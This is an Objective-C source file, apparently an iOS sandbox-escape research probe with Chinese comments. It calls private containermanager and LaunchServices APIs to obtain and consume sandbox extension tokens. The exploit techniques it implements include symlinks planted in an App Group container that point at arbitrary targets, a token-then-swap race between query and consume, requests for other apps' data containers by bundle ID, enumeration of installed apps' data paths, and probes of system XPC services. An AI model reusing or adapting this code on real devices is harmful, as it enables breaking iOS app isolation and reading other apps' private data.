//
//  probe.m
//  独立探针：class 7（自己的 App Group 容器）× part × part-domain × 符号链接形状。
//  不沿用任何公开 PoC 的“替换 part 根目录”入口。
//

#import <Foundation/Foundation.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <stdio.h>
#include <xpc/xpc.h>
#include <sys/stat.h>
#include <CoreFoundation/CoreFoundation.h>
#include "probe.h"

typedef void *(*query_create_fn)(void);
typedef void (*query_set_class_fn)(void *, uint64_t);
typedef void (*query_set_ids_fn)(void *, xpc_object_t);
typedef void (*query_set_part_fn)(void *, uint64_t);
typedef void (*query_set_domain_fn)(void *, const char *);
typedef void (*query_set_flags_fn)(void *, uint64_t);
typedef void *(*query_get_single_fn)(void *);
typedef void (*query_free_fn)(void *);
typedef char *(*query_copy_token_fn)(void *);
typedef int64_t (*ext_consume_fn)(const char *);
typedef const char *(*obj_get_path_fn)(void *);
typedef const char *(*obj_get_ident_fn)(void *);
typedef void (*obj_free_fn)(void *);
typedef void *(*query_last_error_fn)(void *);
typedef uint64_t (*query_count_fn)(void *);
typedef void *(*query_result_at_fn)(void *, uint64_t, void *);
typedef int (*err_int_fn)(void *);

typedef struct {
    void *mgr;
    query_create_fn create;
    query_set_class_fn set_class;
    query_set_ids_fn set_ids;
    query_set_ids_fn set_groups;
    query_set_part_fn set_part;
    query_set_domain_fn set_domain;
    query_set_flags_fn set_flags;
    query_get_single_fn get_single;
    query_free_fn free_query;
    query_copy_token_fn copy_token;
    obj_get_path_fn get_path;
    obj_get_path_fn get_path2;
    query_last_error_fn last_err;
    err_int_fn err_type;
    err_int_fn err_posix;
    ext_consume_fn consume;
    query_count_fn count;
    query_result_at_fn result_at;
    obj_get_ident_fn get_ident;
    obj_free_fn obj_free;
} API;

static API g;
static int gLoaded;

static void loadAPI(void) {
    if (gLoaded) return;
    gLoaded = 1;
    g.mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!g.mgr) return;
    g.create = (query_create_fn)dlsym(g.mgr, "container_query_create");
    g.set_class = (query_set_class_fn)dlsym(g.mgr, "container_query_set_class");
    g.set_ids = (query_set_ids_fn)dlsym(g.mgr, "container_query_set_identifiers");
    g.set_groups = (query_set_ids_fn)dlsym(g.mgr, "container_query_set_group_identifiers");
    g.set_part = (query_set_part_fn)dlsym(g.mgr, "container_query_operation_set_part");
    g.set_domain = (query_set_domain_fn)dlsym(g.mgr, "container_query_operation_set_part_domain");
    g.set_flags = (query_set_flags_fn)dlsym(g.mgr, "container_query_operation_set_flags");
    g.get_single = (query_get_single_fn)dlsym(g.mgr, "container_query_get_single_result");
    g.free_query = (query_free_fn)dlsym(g.mgr, "container_query_free");
    g.copy_token = (query_copy_token_fn)dlsym(g.mgr, "container_copy_sandbox_token");
    g.get_path = (obj_get_path_fn)dlsym(g.mgr, "container_get_path");
    g.get_path2 = (obj_get_path_fn)dlsym(g.mgr, "container_object_get_path");
    g.last_err = (query_last_error_fn)dlsym(g.mgr, "container_query_get_last_error");
    g.err_type = (err_int_fn)dlsym(g.mgr, "container_error_get_type");
    g.err_posix = (err_int_fn)dlsym(g.mgr, "container_error_get_posix_errno");
    g.consume = (ext_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    g.count = (query_count_fn)dlsym(g.mgr, "container_query_count_results");
    g.result_at = (query_result_at_fn)dlsym(g.mgr, "_container_query_get_result_at_index");
    g.get_ident = (obj_get_ident_fn)dlsym(g.mgr, "container_object_get_identifier");
    g.obj_free = (obj_free_fn)dlsym(g.mgr, "container_object_free");
}

static BOOL apiReady(void) {
    loadAPI();
    return g.create && g.set_class && g.set_ids && g.set_part && g.set_flags &&
           g.get_single && g.free_query && g.copy_token && g.consume;
}

NSArray<NSString *> *wq_own_groups(void) {
    void *sec = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_NOW);
    if (!sec) return @[];
    typedef void *(*task_fn)(void *);
    typedef CFTypeRef (*copy_fn)(void *, CFStringRef, CFErrorRef *);
    task_fn mk = (task_fn)dlsym(sec, "SecTaskCreateFromSelf");
    copy_fn cp = (copy_fn)dlsym(sec, "SecTaskCopyValueForEntitlement");
    if (!mk || !cp) return @[];
    NSArray *out = @[];
    void *task = mk(NULL);
    if (!task) return out;
    CFTypeRef v = cp(task, CFSTR("com.apple.security.application-groups"), NULL);
    if (v) {
        if (CFGetTypeID(v) == CFArrayGetTypeID()) out = (NSArray *)CFBridgingRelease(v);
        else CFRelease(v);
    }
    CFRelease((CFTypeRef)task);
    return out;
}

// 一次查询并取 token
static char *queryTokenCopy(uint64_t cls, NSString *groupOrBundle, BOOL isGroup,
                            uint64_t part, uint64_t flags, NSString *domain) {
    if (!apiReady()) return NULL;
    void *q = g.create();
    if (!q) return NULL;

    xpc_object_t ident = xpc_string_create(groupOrBundle.UTF8String);
    g.set_class(q, cls);
    if (isGroup) {
        if (!g.set_groups) { g.free_query(q); return NULL; }
        g.set_groups(q, ident);
    } else {
        g.set_ids(q, ident);
    }
    if (part != UINT64_MAX) g.set_part(q, part);
    if (domain != nil && g.set_domain) g.set_domain(q, domain.UTF8String);
    g.set_flags(q, flags);

    void *res = g.get_single(q);
    if (!res) {
        int et = -1, ep = -1;
        if (g.last_err && g.err_type && g.err_posix) {
            void *err = g.last_err(q);
            if (err) { et = g.err_type(err); ep = g.err_posix(err); }
        }
        printf("[探针] 无结果 cls=%llu part=%llu flags=0x%llx dom=%s type=%d posix=%d\n",
               (unsigned long long)cls, (unsigned long long)part, (unsigned long long)flags,
               domain ? domain.UTF8String : "nil", et, ep);
        g.free_query(q);
        return NULL;
    }

    const char *p = g.get_path ? g.get_path(res) : NULL;
    if (!p && g.get_path2) p = g.get_path2(res);
    printf("[探针] 命中 cls=%llu part=%llu flags=0x%llx dom=%s path=%s\n",
           (unsigned long long)cls, (unsigned long long)part, (unsigned long long)flags,
           domain ? domain.UTF8String : "nil", p ? p : "(null)");

    char *token = g.copy_token(res);
    if (token) printf("[探针] token 串: %s\n", token);
    else printf("[探针] token=nil\n");
    g.free_query(q);
    return token;
}

static char *queryTokenCopyDetail(uint64_t cls, NSString *groupOrBundle, BOOL isGroup,
                                  uint64_t part, uint64_t flags, NSString *domain,
                                  int64_t *hasResult, int64_t *outType, int64_t *outPosix,
                                  int64_t *outTokenOK) {
    if (hasResult) *hasResult = 0;
    if (outType) *outType = -1;
    if (outPosix) *outPosix = -1;
    if (outTokenOK) *outTokenOK = 0;
    if (!apiReady()) return NULL;
    void *q = g.create();
    if (!q) return NULL;

    xpc_object_t ident = xpc_string_create(groupOrBundle.UTF8String);
    g.set_class(q, cls);
    if (isGroup) {
        if (!g.set_groups) { g.free_query(q); return NULL; }
        g.set_groups(q, ident);
    } else {
        g.set_ids(q, ident);
    }
    if (part != UINT64_MAX) g.set_part(q, part);
    if (domain != nil && g.set_domain) g.set_domain(q, domain.UTF8String);
    g.set_flags(q, flags);

    void *res = g.get_single(q);
    if (!res) {
        int et = -1, ep = -1;
        if (g.last_err && g.err_type && g.err_posix) {
            void *err = g.last_err(q);
            if (err) { et = g.err_type(err); ep = g.err_posix(err); }
        }
        if (outType) *outType = et;
        if (outPosix) *outPosix = ep;
        printf("[诊断] 无结果 cls=%llu part=%llu flags=0x%llx dom=%s type=%d posix=%d\n",
               (unsigned long long)cls, (unsigned long long)part, (unsigned long long)flags,
               domain ? domain.UTF8String : "nil", et, ep);
        g.free_query(q);
        return NULL;
    }
    if (hasResult) *hasResult = 1;

    char *token = g.copy_token(res);
    if (outTokenOK) *outTokenOK = token ? 1 : 0;
    printf("[诊断] 命中 cls=%llu part=%llu flags=0x%llx dom=%s token=%s\n",
           (unsigned long long)cls, (unsigned long long)part, (unsigned long long)flags,
           domain ? domain.UTF8String : "nil", token ? "yes" : "nil");
    g.free_query(q);
    return token;
}

int64_t wq_probe_group_detail(NSString *group, NSString *partRel, uint64_t part, uint64_t flags,
                              NSString *domain, NSString *linkTarget,
                              int64_t *queryResult, int64_t *errorType, int64_t *errorPosix,
                              int64_t *tokenOK, int64_t *consumeHandle) {
    if (queryResult) *queryResult = 0;
    if (errorType) *errorType = -1;
    if (errorPosix) *errorPosix = -1;
    if (tokenOK) *tokenOK = 0;
    if (consumeHandle) *consumeHandle = -99;

    NSString *linkPath = nil;
    if (linkTarget != nil && domain.length > 0) {
        NSFileManager *fm = [NSFileManager defaultManager];
        NSURL *root = [fm containerURLForSecurityApplicationGroupIdentifier:group];
        if (!root) { printf("[诊断] 组容器不可用: %s\n", group.UTF8String); return -1; }
        NSString *base = [[root URLByAppendingPathComponent:partRel] path];
        linkPath = [base stringByAppendingPathComponent:domain];
        [fm createDirectoryAtPath:base withIntermediateDirectories:YES attributes:nil error:nil];
        [fm removeItemAtPath:linkPath error:nil];
        NSError *e = nil;
        BOOL ok = [fm createSymbolicLinkAtPath:linkPath withDestinationPath:linkTarget error:&e];
        if (!ok) { printf("[诊断] 建链接失败: %s\n", (e.localizedDescription ?: @"?").UTF8String); return -4; }
    }

    char *token = queryTokenCopyDetail(7, group, YES, part, flags, domain,
                                       queryResult, errorType, errorPosix, tokenOK);
    int64_t h = -6;
    if (token) {
        h = g.consume(token);
        free(token);
    }
    if (consumeHandle) *consumeHandle = h;
    if (linkPath) [[NSFileManager defaultManager] removeItemAtPath:linkPath error:nil];
    return h;
}

static int64_t runQuery(uint64_t cls, NSString *groupOrBundle, BOOL isGroup,
                        uint64_t part, uint64_t flags, NSString *domain) {
    char *token = queryTokenCopy(cls, groupOrBundle, isGroup, part, flags, domain);
    if (!token) return -6;
    int64_t h = g.consume(token);
    printf("[探针] token 消费 h=%lld\n", (long long)h);
    free(token);
    return h;
}

int64_t wq_probe_own_container(uint64_t part, uint64_t flags, NSString *domain) {
    return runQuery(2, [NSBundle mainBundle].bundleIdentifier, NO, part, flags, domain);
}

// 尝试连接安装服务 XPC（诊断：沙盒是否允许 mach lookup）
void wq_try_install_xpc(void) {
    typedef xpc_connection_t (*mach_service_fn)(const char *, dispatch_queue_t, uint64_t);
    mach_service_fn mk = (mach_service_fn)dlsym(RTLD_DEFAULT, "xpc_connection_create_mach_service");
    if (!mk) { NSLog(@"WQXPC symbol missing"); return; }
    xpc_connection_t c = mk("com.apple.mobile.installation_proxy", NULL, 0);
    if (!c) { NSLog(@"WQXPC create failed"); return; }
    xpc_connection_set_event_handler(c, ^(xpc_object_t event) {
        char *d = xpc_copy_description(event);
        NSLog(@"WQXPC event %s", d ? d : "?");
        if (d) free(d);
    });
    xpc_connection_resume(c);

    xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_string(msg, "Command", "Lookup");
    xpc_dictionary_set_int64(msg, "ClientOptions", 0);
    xpc_connection_send_message_with_reply(c, msg, dispatch_get_main_queue(), ^(xpc_object_t reply) {
        char *d = xpc_copy_description(reply);
        NSLog(@"WQXPC reply %s", d ? d : "?");
        if (d) free(d);
    });
}

// 不带标识符枚举容器：count_results + get_result_at_index（诊断用）
uint64_t wq_list_containers(uint64_t cls, uint64_t part, uint64_t flags,
                            NSMutableArray<NSDictionary *> *out, uint64_t limit,
                            int64_t *errType, int64_t *errPosix) {
    if (errType) *errType = -1;
    if (errPosix) *errPosix = -1;
    if (!apiReady() || !g.count || !g.result_at) return 0;

    void *q = g.create();
    if (!q) return 0;
    g.set_class(q, cls);
    if (part != UINT64_MAX) g.set_part(q, part);
    g.set_flags(q, flags);

    uint64_t n = g.count(q);
    if (n == 0 && g.last_err && g.err_type && g.err_posix) {
        void *err = g.last_err(q);
        if (err) {
            if (errType) *errType = g.err_type(err);
            if (errPosix) *errPosix = g.err_posix(err);
        }
    }
    uint64_t cap = n < limit ? n : limit;
    for (uint64_t i = 0; i < cap; i++) {
        void *res = g.result_at(q, i, NULL);
        if (!res) continue;
        const char *p = g.get_path ? g.get_path(res) : NULL;
        if (!p && g.get_path2) p = g.get_path2(res);
        const char *ident = g.get_ident ? g.get_ident(res) : NULL;
        [out addObject:@{
            @"path": p ? [NSString stringWithUTF8String:p] : @"",
            @"identifier": ident ? [NSString stringWithUTF8String:ident] : @""
        }];
    }
    g.free_query(q);
    return n;
}

// 参考实现的枚举形状：不带标识符 + iterate_results_sync 回调
typedef bool (*query_iterate_fn)(void *, void (^)(void *));

uint64_t wq_iterate_containers(uint64_t cls, uint64_t part, uint64_t flags,
                               NSMutableArray<NSDictionary *> *out, uint64_t limit,
                               int64_t *errType, int64_t *errPosix, int64_t *iterOK) {
    if (errType) *errType = -1;
    if (errPosix) *errPosix = -1;
    if (iterOK) *iterOK = -1;
    if (!apiReady()) return 0;
    query_iterate_fn iterate = (query_iterate_fn)dlsym(g.mgr, "container_query_iterate_results_sync");
    if (!iterate) return 0;

    void *q = g.create();
    if (!q) return 0;
    g.set_class(q, cls);
    if (part != UINT64_MAX) g.set_part(q, part);
    g.set_flags(q, flags);

    __block uint64_t n = 0;
    void (^blk)(void *) = ^(void *res) {
        if (!res) return;
        if (n < limit) {
            const char *p = g.get_path ? g.get_path(res) : NULL;
            if (!p && g.get_path2) p = g.get_path2(res);
            const char *ident = g.get_ident ? g.get_ident(res) : NULL;
            [out addObject:@{
                @"path": p ? [NSString stringWithUTF8String:p] : @"",
                @"identifier": ident ? [NSString stringWithUTF8String:ident] : @""
            }];
        }
        n++;
    };
    bool ok = iterate(q, blk);
    if (iterOK) *iterOK = ok ? 1 : 0;
    if (n == 0 && g.last_err && g.err_type && g.err_posix) {
        void *err = g.last_err(q);
        if (err) {
            if (errType) *errType = g.err_type(err);
            if (errPosix) *errPosix = g.err_posix(err);
        }
    }
    g.free_query(q);
    return n;
}

// class 2 按 bundle id 取任意 App 数据容器路径并尝试 consume；返回路径，handle<0 表示授权失败
NSString *wq_bundle_container(NSString *bundle, uint64_t part, uint64_t flags,
                              int64_t *handle, int64_t *errType, int64_t *errPosix) {
    if (handle) *handle = -99;
    if (errType) *errType = -1;
    if (errPosix) *errPosix = -1;
    if (!apiReady()) return nil;

    void *q = g.create();
    if (!q) return nil;
    xpc_object_t ident = xpc_string_create(bundle.UTF8String);
    g.set_class(q, 2);
    g.set_ids(q, ident);
    if (part != UINT64_MAX) g.set_part(q, part);
    g.set_flags(q, flags);

    void *res = g.get_single(q);
    if (!res) {
        if (g.last_err && g.err_type && g.err_posix) {
            void *err = g.last_err(q);
            if (err) {
                if (errType) *errType = g.err_type(err);
                if (errPosix) *errPosix = g.err_posix(err);
            }
        }
        g.free_query(q);
        return nil;
    }

    const char *p = g.get_path ? g.get_path(res) : NULL;
    if (!p && g.get_path2) p = g.get_path2(res);
    NSString *path = p ? [NSString stringWithUTF8String:p] : nil;

    char *token = g.copy_token(res);
    int64_t h = -6;
    if (token) {
        h = g.consume(token);
        free(token);
    }
    if (handle) *handle = h;
    g.free_query(q);
    return path;
}

NSString *wq_lease_probe(uint64_t cls, NSString *ident, BOOL isGroup, uint64_t part,
                         uint64_t flags, NSString *domain, int64_t *handle,
                         int64_t *errType, int64_t *errPosix) {
    if (handle) *handle = -99;
    if (errType) *errType = -1;
    if (errPosix) *errPosix = -1;
    if (!apiReady()) return nil;

    void *q = g.create();
    if (!q) return nil;
    xpc_object_t identObj = xpc_string_create(ident.UTF8String);
    g.set_class(q, cls);
    if (isGroup) {
        if (!g.set_groups) { g.free_query(q); return nil; }
        g.set_groups(q, identObj);
    } else {
        g.set_ids(q, identObj);
    }
    if (part != UINT64_MAX) g.set_part(q, part);
    if (domain.length > 0 && g.set_domain) g.set_domain(q, domain.UTF8String);
    g.set_flags(q, flags);

    void *res = g.get_single(q);
    if (!res) {
        if (g.last_err && g.err_type && g.err_posix) {
            void *err = g.last_err(q);
            if (err) {
                if (errType) *errType = g.err_type(err);
                if (errPosix) *errPosix = g.err_posix(err);
            }
        }
        g.free_query(q);
        return nil;
    }

    const char *p = g.get_path ? g.get_path(res) : NULL;
    if (!p && g.get_path2) p = g.get_path2(res);
    NSString *path = p ? [NSString stringWithUTF8String:p] : nil;

    // class 13 的结果对象没有 sandbox token 数组，copy_token 会走 xpc_array_get_string
    // 触发 xpc_api_misuse 直接 SIGTRAP，因此只取路径。
    if (cls != 13) {
        char *token = g.copy_token(res);
        if (token) {
            if (handle) *handle = g.consume(token);
            free(token);
        }
    }
    g.free_query(q);
    return path;
}

int64_t wq_probe_own_detail(uint64_t part, uint64_t flags,
                            int64_t *queryResult, int64_t *errorType, int64_t *errorPosix,
                            int64_t *tokenOK, int64_t *consumeHandle) {
    if (queryResult) *queryResult = 0;
    if (errorType) *errorType = -1;
    if (errorPosix) *errorPosix = -1;
    if (tokenOK) *tokenOK = 0;
    if (consumeHandle) *consumeHandle = -99;

    char *token = queryTokenCopyDetail(2, [NSBundle mainBundle].bundleIdentifier, NO, part, flags, nil,
                                       queryResult, errorType, errorPosix, tokenOK);
    int64_t h = -6;
    if (token) {
        h = g.consume(token);
        free(token);
    }
    if (consumeHandle) *consumeHandle = h;
    return h;
}

static int64_t probeGroupImpl(NSString *group, NSString *partRel, uint64_t part, uint64_t flags,
                              NSString *domain, NSString *linkTarget, bool *linkOk, BOOL keepLink) {
    if (linkOk) *linkOk = false;

    NSString *linkPath = nil;
    if (linkTarget != nil && domain.length > 0) {
        NSFileManager *fm = [NSFileManager defaultManager];
        NSURL *root = [fm containerURLForSecurityApplicationGroupIdentifier:group];
        if (!root) { printf("[探针] 组容器不可用: %s\n", group.UTF8String); return -1; }
        NSString *base = [[root URLByAppendingPathComponent:partRel] path];
        linkPath = [base stringByAppendingPathComponent:domain];
        [fm removeItemAtPath:linkPath error:nil];
        NSError *e = nil;
        BOOL ok = [fm createSymbolicLinkAtPath:linkPath withDestinationPath:linkTarget error:&e];
        printf("[探针] 子链接 %s -> %s : %d %s\n", linkPath.UTF8String, linkTarget.UTF8String, ok,
               ok ? "" : (e.localizedDescription ?: @"?").UTF8String);
        if (!ok) return -4;
        if (linkOk) *linkOk = true;
    }

    int64_t h = runQuery(7, group, YES, part, flags, domain);

    if (linkPath && !keepLink) {
        [[NSFileManager defaultManager] removeItemAtPath:linkPath error:nil];
    }
    return h;
}

int64_t wq_probe_group(NSString *group, NSString *partRel, uint64_t part, uint64_t flags,
                       NSString *domain, NSString *linkTarget, bool *linkOk) {
    return probeGroupImpl(group, partRel, part, flags, domain, linkTarget, linkOk, NO);
}

int64_t wq_probe_group_keep(NSString *group, NSString *partRel, uint64_t part, uint64_t flags,
                            NSString *domain, NSString *linkTarget, bool *linkOk) {
    return probeGroupImpl(group, partRel, part, flags, domain, linkTarget, linkOk, YES);
}

// 时序差实验：先查询拿到 token（此时 domain 是普通目录），再把该目录换成指向目标的符号链接，
// 最后才 consume，看消费方是否在消费时重新解析路径。
int64_t wq_probe_group_swap(NSString *group, NSString *partRel, uint64_t part, uint64_t flags,
                            NSString *domain, NSString *linkTarget, bool *linkOk) {
    if (linkOk) *linkOk = false;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSURL *root = [fm containerURLForSecurityApplicationGroupIdentifier:group];
    if (!root) { printf("[交换] 组容器不可用: %s\n", group.UTF8String); return -1; }
    NSString *base = [[root URLByAppendingPathComponent:partRel] path];
    NSString *linkPath = [base stringByAppendingPathComponent:domain];
    [fm createDirectoryAtPath:base withIntermediateDirectories:YES attributes:nil error:nil];

    char *token = queryTokenCopy(7, group, YES, part, flags, domain);
    if (!token) { printf("[交换] 查询未拿到 token\n"); return -6; }

    [fm removeItemAtPath:linkPath error:nil];
    NSError *e = nil;
    BOOL ok = [fm createSymbolicLinkAtPath:linkPath withDestinationPath:linkTarget error:&e];
    printf("[交换] 查询后换链接 %s -> %s : %d %s\n", linkPath.UTF8String, linkTarget.UTF8String, ok,
           ok ? "" : (e.localizedDescription ?: @"?").UTF8String);
    if (!ok) { free(token); return -4; }
    if (linkOk) *linkOk = true;

    int64_t h = g.consume(token);
    printf("[交换] 换链接后消费 h=%lld\n", (long long)h);
    free(token);
    return h;
}

#pragma mark - LaunchServices / XPC 只读诊断

#import <objc/runtime.h>

NSString *wq_ls_methods(void) {
    NSArray *names = @[@"LSApplicationWorkspace", @"LSApplicationProxy", @"LSBundleProxy",
                       @"LSApplicationRecord", @"LSApplicationExtensionRecord", @"LSResourceProxy"];
    NSMutableString *out = [NSMutableString string];
    for (NSString *n in names) {
        Class cls = NSClassFromString(n);
        if (!cls) { [out appendFormat:@"%@ MISSING\n", n]; continue; }
        unsigned int count = 0;
        Method *ms = class_copyMethodList(cls, &count);
        NSMutableArray *sels = [NSMutableArray array];
        for (unsigned int i = 0; i < count; i++) {
            [sels addObject:NSStringFromSelector(method_getName(ms[i]))];
        }
        free(ms);
        [sels sortUsingSelector:@selector(compare:)];
        [out appendFormat:@"%@ instance(%u): %@\n", n, count, [sels componentsJoinedByString:@", "]];
        unsigned int ccount = 0;
        Method *cms = class_copyMethodList(object_getClass(cls), &ccount);
        NSMutableArray *csels = [NSMutableArray array];
        for (unsigned int i = 0; i < ccount; i++) {
            [csels addObject:NSStringFromSelector(method_getName(cms[i]))];
        }
        free(cms);
        if (ccount) {
            [csels sortUsingSelector:@selector(compare:)];
            [out appendFormat:@"%@ class(%u): %@\n", n, ccount, [csels componentsJoinedByString:@", "]];
        }
    }
    return out;
}

NSString *wq_xpc_lookup(NSString *service) {
    typedef xpc_connection_t (*create_fn)(const char *, dispatch_queue_t, uint64_t);
    void *h = dlopen("/usr/lib/system/libxpc.dylib", RTLD_LAZY);
    if (!h) { h = dlopen("/usr/lib/libxpc.dylib", RTLD_LAZY); }
    create_fn create = h ? (create_fn)dlsym(h, "xpc_connection_create_mach_service") : NULL;
    if (!create) { return @"symbol missing"; }
    __block NSString *status = @"connected(1.5s no error)";
    xpc_connection_t conn = create(service.UTF8String, NULL, 0);
    if (!conn) { return @"create failed"; }
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
        if (xpc_get_type(event) == XPC_TYPE_ERROR) {
            const char *d = xpc_dictionary_get_string(event, XPC_ERROR_KEY_DESCRIPTION);
            status = [NSString stringWithFormat:@"denied: %s", d ?: "?"];
            dispatch_semaphore_signal(sem);
        }
    });
    xpc_connection_resume(conn);
    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 1500 * NSEC_PER_MSEC));
    xpc_connection_cancel(conn);
    return status;
}

NSString *wq_ls_enumerate(void) {
    Class wcls = NSClassFromString(@"LSApplicationWorkspace");
    if (!wcls) { return @"WS missing"; }
    id ws = [wcls performSelector:sel_registerName("defaultWorkspace")];
    if (!ws) { return @"workspace nil"; }
    SEL sel = sel_registerName("enumerateApplicationsOfType:block:");
    if (![ws respondsToSelector:sel]) { return @"selector missing"; }
    NSMutableString *out = [NSMutableString string];
    for (unsigned long type = 0; type <= 1; type++) {
        __block NSInteger n = 0;
        __block NSString *first = @"";
        void (^blk)(id) = ^(id obj) {
            n++;
            if (n == 1) {
                NSString *bid = [obj respondsToSelector:sel_registerName("bundleIdentifier")]
                    ? [obj valueForKey:@"bundleIdentifier"] : nil;
                first = bid ?: [obj description];
            }
        };
        IMP imp = [ws methodForSelector:sel];
        ((void (*)(id, SEL, unsigned long, id))imp)(ws, sel, type, blk);
        [out appendFormat:@"type=%lu n=%ld first=%@\n", type, (long)n, first];
    }
    return out;
}

static NSInteger wq_record_walk(id en, NSMutableString *out, NSMutableArray *samples, NSInteger limit) {
    NSInteger n = 0, withPath = 0;
    @try {
        id obj;
        while ((obj = [en nextObject]) && n < limit) {
            n++;
            NSString *bid = nil, *path = nil;
            @try { bid = [obj valueForKey:@"bundleIdentifier"]; } @catch (NSException *e) {}
            @try {
                id proxy = [obj valueForKey:@"fbs_correspondingApplicationProxy"];
                path = [[proxy valueForKey:@"dataContainerURL"] path];
            } @catch (NSException *e) {}
            if (path.length) { withPath++; }
            if ([samples count] < 8) {
                [samples addObject:[NSString stringWithFormat:@"%@ -> %@", bid ?: @"?", path.length ? path : @"nil"]];
            }
        }
    } @catch (NSException *e) {
        [out appendFormat:@"walk exception: %@\n", e.reason];
    }
    [out appendFormat:@"records n=%ld withPath=%ld\n", (long)n, (long)withPath];
    [out appendString:[samples componentsJoinedByString:@"\n"]];
    [out appendString:@"\n"];
    return withPath;
}

NSString *wq_ls_records(void) {
    Class rec = NSClassFromString(@"LSApplicationRecord");
    if (!rec) { return @"LSApplicationRecord missing"; }
    NSMutableString *out = [NSMutableString string];

    SEL sel = sel_registerName("enumeratorWithOptions:");
    if ([rec respondsToSelector:sel]) {
        IMP imp = [rec methodForSelector:sel];
        for (unsigned long opt = 0; opt <= 1; opt++) {
            [out appendFormat:@"enumeratorWithOptions:%lu -> ", opt];
            id en = ((id (*)(id, SEL, unsigned long))imp)(rec, sel, opt);
            if (!en) { [out appendString:@"nil\n"]; continue; }
            [out appendString:@"\n"];
            wq_record_walk(en, out, [NSMutableArray array], 400);
        }
    } else {
        [out appendString:@"enumeratorWithOptions: missing\n"];
    }

    SEL vsel = sel_registerName("enumeratorOnVolumeAtURL:options:");
    if ([rec respondsToSelector:vsel]) {
        [out appendString:@"enumeratorOnVolumeAtURL:/ -> "];
        IMP vimp = [rec methodForSelector:vsel];
        id en = ((id (*)(id, SEL, id, unsigned long))vimp)(rec, vsel,
                                                           [NSURL fileURLWithPath:@"/"], 0);
        if (!en) {
            [out appendString:@"nil\n"];
        } else {
            [out appendString:@"\n"];
            wq_record_walk(en, out, [NSMutableArray array], 400);
        }
    }

    SEL psel = sel_registerName("remotePlaceholderEnumerator");
    if ([rec respondsToSelector:psel]) {
        IMP pimp = [rec methodForSelector:psel];
        id en = ((id (*)(id, SEL))pimp)(rec, psel);
        [out appendFormat:@"remotePlaceholderEnumerator -> %@\n", en ? @"non-nil" : @"nil"];
    }
    return out;
}

NSString *wq_xpc_ping(NSString *service) {
    typedef xpc_connection_t (*create_fn)(const char *, dispatch_queue_t, uint64_t);
    void *h = dlopen("/usr/lib/system/libxpc.dylib", RTLD_LAZY);
    if (!h) { h = dlopen("/usr/lib/libxpc.dylib", RTLD_LAZY); }
    create_fn create = h ? (create_fn)dlsym(h, "xpc_connection_create_mach_service") : NULL;
    if (!create) { return @"symbol missing"; }
    __block NSString *status = @"timeout";
    xpc_connection_t conn = create(service.UTF8String, NULL, 0);
    if (!conn) { return @"create failed"; }
    xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
        if (xpc_get_type(event) == XPC_TYPE_ERROR) {
            const char *d = xpc_dictionary_get_string(event, XPC_ERROR_KEY_DESCRIPTION);
            status = [NSString stringWithFormat:@"conn-error: %s", d ?: "?"];
        }
    });
    xpc_connection_resume(conn);
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_string(msg, "wq_probe", "1");
    xpc_connection_send_message_with_reply(conn, msg, dispatch_get_global_queue(0, 0), ^(xpc_object_t reply) {
        if (xpc_get_type(reply) == XPC_TYPE_ERROR) {
            const char *d = xpc_dictionary_get_string(reply, XPC_ERROR_KEY_DESCRIPTION);
            status = [NSString stringWithFormat:@"reply-error: %s", d ?: "?"];
        } else {
            status = @"reply-ok";
        }
        dispatch_semaphore_signal(sem);
    });
    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC));
    xpc_connection_cancel(conn);
    return status;
}
